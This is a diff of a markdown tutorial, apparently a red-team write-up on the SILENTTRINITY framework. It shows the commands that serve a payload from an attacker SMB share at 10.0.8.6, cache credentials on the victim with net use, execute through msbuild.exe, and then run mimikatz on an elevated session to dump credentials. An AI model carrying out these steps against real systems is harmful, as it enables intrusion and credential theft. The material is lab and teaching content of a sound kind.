@@ -88,7 +88,7 @@ First create a share folder and then start the SMB server from impacket.
 {% code-tabs-item title="hacker@kali" %}
 ```text
 mkdir /opt/SMB
-smbserver.py SMB /opt/SMB -smb2support -ip 10.0.8.6
+smbserver.py SMB /opt/SMB -username hacker -password hacker -smb2support -ip 10.0.8.6
 ```
 {% endcode-tabs-item %}
 {% endcode-tabs %}
@@ -112,7 +112,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe \\10.0.8.6\SMB\msbui
 
 ### Caching credentials
 
-So why did we specify credentials then? On Windows 10 you can't use SMB unauthenticated by default. And as far as I know there isn't a way to give msbuild credentials directly. So I fiddled around and find a little trick to cache some credentials for my SMB server on the host.  As you can see below I use hacker/hacker for authentication. Very secure of course. So on the target, trigger an authenticated `net use` command. This should try to access the SMB share with the specified credentials, and also cache them locally.
+So why did we specify credentials then? On Windows 10 you can't use SMB unauthenticated by default. And as far as I know there isn't a way to give msbuild credentials directly. So I fiddled around and find a little trick to cache some credentials for my SMB server on the host.  As you see I use hacker/hacker for authentication. Very secure of course. On the target, trigger an authenticated `net use` command. This should try to access the SMB share with the specified credentials, and therefore cache them locally on the target. From an opsec perspective this isn’t ideal, so if you have suggestions please reach out.
 
 {% code-tabs %}
 {% code-tabs-item title="victim@target" %}
@@ -132,11 +132,11 @@ Voila! Something started happening. Let's check back in ST.
 
 ![](../.gitbook/assets/image%20%2836%29.png)
 
-Like sweet magic, we got a session!
+Like sweet magic, we got a session. The authentication reuses the credentials that were cached.
 
 ## Modules
 
-First list the session you just acquired. Because I triggered the payload from an elevated shell I have a session with elevated privileges. That allows me to do things like dump credentials and other kinds of post exploitation fun.
+Now we list the session we just acquired. Because I triggered the payload from an elevated shell, we have a session with elevated privileges. That allows us to do things like dump credentials and other kinds of post exploitation fun.
 
 {% code-tabs %}
 {% code-tabs-item title="hacker@st" %}
@@ -153,7 +153,7 @@ So let's explore some of the post exploitation modules that ST has to offer. As 
 
 ![](../.gitbook/assets/image%20%282%29.png)
 
-Let's select the `mimikatz` module and run it towards our session. Word of notice here, you have to copypaste the GUID of the session beforehand so you have it ready. You can alternatively use `run all` to run it on all session, if you have several.
+Let's select the `mimikatz`  module and run it towards our session. Word of notice here, you have to copy the GUID from the session list so you have it ready. You can alternatively use `run all` to run it on all session, if you have several sessions.
 
 {% code-tabs %}
 {% code-tabs-item title="hacker@st" %}
